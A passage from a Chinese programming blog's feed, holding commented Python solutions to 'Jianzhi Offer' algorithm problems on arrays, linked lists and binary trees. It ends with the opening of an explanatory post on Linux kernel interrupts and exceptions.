class="headerlink" title="剑指 Offer 66. 构建乘积数组(medium)"></a>剑指 Offer 66. 构建乘积数组(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constructArr</span><span class="params">(self, a)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type a: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        从前向后累乘一次并保存结果，从后向前累乘一次并保存结果</span></span><br><span class="line"><span class="string">        就[1,2,3,4,5]而言</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(a)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res1 = [] </span><br><span class="line">        res2 = []</span><br><span class="line">        result = []</span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[:<span class="number">-1</span>]: <span class="comment">#从前向后乘只计算到倒数第二个数</span></span><br><span class="line">            m*=i</span><br><span class="line">            res1.append(m) <span class="comment">#res1中保存[1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[::<span class="number">-1</span>][:<span class="number">-1</span>]: <span class="comment">#从后向前乘只计算到第二个数</span></span><br><span class="line">            n*=i</span><br><span class="line">            res2.append(n) <span class="comment">#res2中保存[5,5*4,5*4*3,5*4*3*2]</span></span><br><span class="line">        res2 = res2[::<span class="number">-1</span>] <span class="comment">#反转后得[5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        此时res1 = [1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line"><span class="string">            res2 = [5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line"><span class="string">        我们可以得到当缺失第一个数时，值为res2[0]</span></span><br><span class="line"><span class="string">        当缺失最后一个数时，值为res1[-1]</span></span><br><span class="line"><span class="string">        从缺失第二个数到倒数第二个数</span></span><br><span class="line"><span class="string">        我们可以得到值为res[i]*res[i-1]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res2)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                result.append(res2[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">elif</span> i == len(res2):</span><br><span class="line">                result.append(res1[<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(res2[i]*res1[i<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-63-股票的最大利润-medium"><a href="#剑指-Offer-63-股票的最大利润-medium" class="headerlink" title="剑指 Offer 63. 股票的最大利润(medium)"></a>剑指 Offer 63. 股票的最大利润(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        max_num=<span class="number">0</span> <span class="comment">#记录当前股票最大差值</span></span><br><span class="line">        <span class="keyword">if</span> len(prices)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        min_num=prices[<span class="number">0</span>] <span class="comment">#将第一天的股票作为最小的值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            min_num = min(min_num,prices[i<span class="number">-1</span>]) <span class="comment">#判断当天和当前最小值中的最小值</span></span><br><span class="line">            <span class="keyword">if</span> prices[i]-min_num&gt;max_num: <span class="comment">#如果当天的股票减去之前的股票最小值大于最大差值</span></span><br><span class="line">                max_num = prices[i]-min_num <span class="comment">#则替换最大差值</span></span><br><span class="line">        <span class="keyword">return</span> max_num</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-36-二叉搜索树与双向链表-medium"><a href="#剑指-Offer-36-二叉搜索树与双向链表-medium" class="headerlink" title="剑指 Offer 36. 二叉搜索树与双向链表(medium)"></a>剑指 Offer 36. 二叉搜索树与双向链表(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node(object):</span></span><br><span class="line"><span class="string">    def __init__(self, val, left=None, right=None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    head = <span class="literal">None</span></span><br><span class="line">    tail = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeToDoublyList</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        self.pre(root) <span class="comment">#中序遍历</span></span><br><span class="line">        self.head.left = self.tail <span class="comment">#头节点前驱指向尾节点</span></span><br><span class="line">        self.tail.right = self.head <span class="comment">#尾节点后驱指向头节点</span></span><br><span class="line">        <span class="keyword">return</span> self.head</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.pre(root.left)</span><br><span class="line">        <span class="keyword">if</span>(self.head == <span class="literal">None</span>):</span><br><span class="line">            self.head = self.tail = root</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.tail.right = root</span><br><span class="line">            root.left = self.tail</span><br><span class="line">            self.tail = root</span><br><span class="line">        self.pre(root.right)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-31-栈的压入、弹出序列-medium"><a href="#剑指-Offer-31-栈的压入、弹出序列-medium" class="headerlink" title="剑指 Offer 31. 栈的压入、弹出序列(medium)"></a>剑指 Offer 31. 栈的压入、弹出序列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validateStackSequences</span><span class="params">(self, pushed, popped)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type pushed: List[int]</span></span><br><span class="line"><span class="string">        :type popped: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        s = [] <span class="comment">#初始化一个栈</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> popped:</span><br><span class="line">            <span class="comment">#得到每一个pop出去的数字在push数组中的下标</span></span><br><span class="line">            <span class="comment">#加一为了方便后续对s栈进行插入操作，即这里res-1才是真正的下标</span></span><br><span class="line">            res = pushed.index(i)+<span class="number">1</span></span><br><span class="line">            <span class="comment">#如果当前pop出去的数在push数组的下标大于s栈的长度</span></span><br><span class="line">            <span class="comment">#则需要将下标数字之前的数字都写入s栈中</span></span><br><span class="line">            <span class="keyword">if</span> res &gt; len(s):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(len(s),res):</span><br><span class="line">                    s.append(k)</span><br><span class="line">                <span class="comment">#这一步对pop出去的下标置为-1</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">            <span class="comment">#如果当前pop出去的数在push数组的下标小于s栈的长度</span></span><br><span class="line">            <span class="comment">#则我们只需要判断在s栈中对于res下标之后的数值是否为-1即可</span></span><br><span class="line">            <span class="keyword">elif</span> res &lt; len(s):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(res,len(s)):</span><br><span class="line">                    <span class="comment">#如果在res下标之后存在不为-1的下标，则直接返回false</span></span><br><span class="line">                    <span class="keyword">if</span> s[j] != <span class="number">-1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">                <span class="comment">#如果res下标之后存在s栈中的都是-1</span></span><br><span class="line">                <span class="comment">#则对当前下标进行置为-1操作</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">        <span class="comment">#循环结束的话返回True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-35-复杂链表的复制-medium"><a href="#剑指-Offer-35-复杂链表的复制-medium" class="headerlink" title="剑指 Offer 35. 复杂链表的复制(medium)"></a>剑指 Offer 35. 复杂链表的复制(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, x, next=None, random=None):</span></span><br><span class="line"><span class="string">        self.val = int(x)</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">        self.random = random</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        node = head <span class="comment">#保留头节点不改变</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#先用字典单独复制每一个节点信息</span></span><br><span class="line">            d[node] = Node(node.val)</span><br><span class="line">            node = node.next</span><br><span class="line">        node = head <span class="comment">#保留头节点不改变</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#链接每一个单节点</span></span><br><span class="line">            d[node].next = d.get(node.next)</span><br><span class="line">            d[node].random = d.get(node.random)</span><br><span class="line">            node = node.next</span><br><span class="line">        <span class="keyword">return</span> d[head]</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-07-重建二叉树-medium"><a href="#剑指-Offer-07-重建二叉树-medium" class="headerlink" title="剑指 Offer 07. 重建二叉树(medium)"></a>剑指 Offer 07. 重建二叉树(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildTree</span><span class="params">(self, preorder, inorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type preorder: List[int]</span></span><br><span class="line"><span class="string">        :type inorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> preorder:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(preorder[<span class="number">0</span>]) <span class="comment">#将前序遍历第一个值作为根节点</span></span><br><span class="line">        index = inorder.index(preorder[<span class="number">0</span>]) <span class="comment">#找到根节点再中序遍历中的位置</span></span><br><span class="line">        root.left = self.buildTree(preorder[<span class="number">1</span>:<span class="number">1</span>+index],inorder[:index]) <span class="comment">#递归构建左子树</span></span><br><span class="line">        root.right = self.buildTree(preorder[<span class="number">1</span>+index:],inorder[index+<span class="number">1</span>:]) <span class="comment">#递归构建右子树</span></span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-45-把数组排成最小的数-medium"><a href="#剑指-Offer-45-把数组排成最小的数-medium" class="headerlink" title="剑指 Offer 45. 把数组排成最小的数(medium)"></a>剑指 Offer 45. 把数组排成最小的数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        思路分析</span></span><br><span class="line"><span class="string">        依次比较nums中的数字，将尽可能组合起来小的数放在res数组的前面</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#先准备一个空的数组，用来存数组</span></span><br><span class="line">        res = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment">#如果res为空，那么直接添加当前数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                res.append(i)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果res不为空，则从nums的当前数与res中的每一个数组合起来进行比较</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                分别将当前数字和res中的每一个数字组合进行比较</span></span><br><span class="line"><span class="string">                例如nums当前数是30，res中的当前数是3</span></span><br><span class="line"><span class="string">                我们会得到两个组合，分别是303和330</span></span><br><span class="line"><span class="string">                将这两个数进行比较，发现303会小一些，所以我们将3放在30后面</span></span><br><span class="line"><span class="string">                在res数组中表现为继续向后比较</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                s1 = str(res[j]) + str(i)</span><br><span class="line">                s2 = str(i) + str(res[j])</span><br><span class="line">                <span class="keyword">if</span> int(s1) &lt; int(s2):</span><br><span class="line">                    <span class="keyword">continue</span> <span class="comment">#继续向后比较</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment">#如果nums中的数放在res[j]之前会使得值更小一些</span></span><br><span class="line">                    <span class="comment">#那么我们就把nums中的当前数插入到res[j]之前这个位置</span></span><br><span class="line">                    res[j:j] = [i]</span><br><span class="line">                    <span class="comment">#flag=1说明已经nums中的值已经插入到res中了，不需要再比较了</span></span><br><span class="line">                    <span class="comment">#直接退出res循环</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果flag=0说明res已经遍历结束</span></span><br><span class="line">            <span class="comment">#这个时候只需要将nums当前值插入到res后面即可</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(i)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            s += str(i)</span><br><span class="line">        <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-37-序列化二叉树-hard"><a href="#剑指-Offer-37-序列化二叉树-hard" class="headerlink" title="剑指 Offer 37. 序列化二叉树(hard)"></a>剑指 Offer 37. 序列化二叉树(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Codec</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.strTree=[]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""Encodes a tree to a single string.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            self.strTree.append(<span class="string">"null"</span>)</span><br><span class="line">            <span class="keyword">return</span> self.strTree</span><br><span class="line">        curStr = str(root.val)</span><br><span class="line">        self.strTree.append(curStr)</span><br><span class="line">        self.serialize(root.left)</span><br><span class="line">        self.serialize(root.right)</span><br><span class="line">        <span class="keyword">return</span> self.strTree</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Decodes your encoded data to tree.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type data: str</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span> <span class="keyword">and</span> data[<span class="number">0</span>] == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        Tval = data.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> Tval == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(Tval)</span><br><span class="line">        root.left = self.deserialize(data)</span><br><span class="line">        root.right = self.deserialize(data)</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Codec object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># codec = Codec()</span></span><br><span class="line"><span class="comment"># codec.deserialize(codec.serialize(root))</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;剑指-Offer-43-1～n-整数中-1-出现的次数-hard&quot;&gt;&lt;a href=&quot;#剑指-Offer-43-1～n-整数中-1-出现的次数-hard&quot; class=&quot;headerlink&quot; title=&quot;剑指 Offer 43. 1～n 整数中 1 出现的次数
      
    
    </summary>
    
    
      <category term="算法" scheme="elssm.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>深入理解linux内核之中断和异常</title>
    <link href="elssm.github.io/2021/11/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3linux%E5%86%85%E6%A0%B8%E4%B9%8B%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
    <id>elssm.github.io/2021/11/23/深入理解linux内核之中断和异常/</id>
    <published>2021-11-23T13:51:39.000Z</published>
    <updated>2021-11-25T13:37:46.940Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>中断通常被定义为一个事件，该事件改变处理器执行的指令顺序。这样的事件与CPU芯片内外部硬件电路产生的电信号相对应。</p><p>中断通常分为同步(synchronous)中断和异步(asynchronous)中断：</p><ul><li>同步中断是当指令执行时由CPU控制单元产生的，之所以称为同步，是因为只有在一条指令终止执行后CPU才会发出中断。</li><li>异步中断是由其他硬件设备依照CPU时钟信号随机产生的。</li></ul><p>在Intel微处理器手册中，把同步和异步中断分别称为异常(exception)和中断(interrupt)</p><p>中断是由<strong>间隔定时器</strong>和<strong>I/O设备</strong>产生的，例如，用户的一次按键会引起一个中断。</p><p>异常是由程序的错误产生的，或者是由内核必须处理的异常条件产生的。第一种情况下，内核通过发送一个信号来处理异常，例如<code>SIGTERM、SIGINT</code>等。第二种情况下，内核执行恢复异常需要的所有步骤，例如缺页，或对内核服务的一个请求。</p><h4 id="中断信号的作用"><a href="#中断信号的作用" class="headerlink" title="中断信号的作用"></a>中断信号的作用</h4><p>中断信号提供了一种特殊的方式，使得处理器转而去运行正常控制流之外的代码。当一个中断信号到达时，CPU必须停止它当前所做的事情，并且切换到一个新的活动，为了做到这一点，就要在内核态堆栈保存程序计数器的当前值(即eip和cs寄存器的内容)，并把与中断类型相关的一个地址放进程序计数器。</p><p>必须要声明的是，中断处理与进程切换有一个明显的差异：由中断或异常处理程序执行的代码不是一个进程。更确切地说，它是一个内核控制路径，代表中断发生时正在运行的进程执行，作为一个内核控制路径，中断处理程序比一个进程要“轻”（这是因为中断的上下文很少，建立或终止中断处理需要的事件很少）</p><p>中断处理是由内核执行的最敏感的任务之一，它必须满足以下约束</p><ul><li>内核的目标就是让中断尽可能快的处理完，尽其所能把更多的处理向后推迟，例如，假设一个数据块已经到达了网线，当硬件中断内核时，内核只简单的标志数据到来了，让处理器恢复到它以前运行的状态，其余的处理稍后再进行（如把数据移入一个缓冲区，它的接收进程可以在缓冲区找到数据并恢复这个进程的执行）。因此，内核响应中断后需要进行的操作分为两部分：对于关键紧急的部分，内核立即执行；其余部分内核随后执行。</li><li>因为中断随时会到来，所以内核可能正在处理其中一个中断时，另一个中断又发生了，应该尽可能多的允许这种情况发生，因为这能维持更多的I/O设备处于忙状态。因此，中断处理程序必须编写成使相应的内核控制路径能以嵌套的方式执行。当最后一个内核控制路径终止时，内核必须能恢复被中断进程的执行，或者，如果中断信号已导致了重新调度，内核能切换到另外的进程。</li><li>尽管内核在处理前一个中断时可以接受一个新的中断，但在内核代码中还是存在一些临界区，在临界区中，中断必须被禁止。必须尽可能地限制这样的临界区，因为根据以前的要求，内核尤其是中断处理程序，应该在大部分时间内以开中断的方式运行。</li></ul><h4 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h4><h5 id="中断"><a href="#中断" class="headerlink" 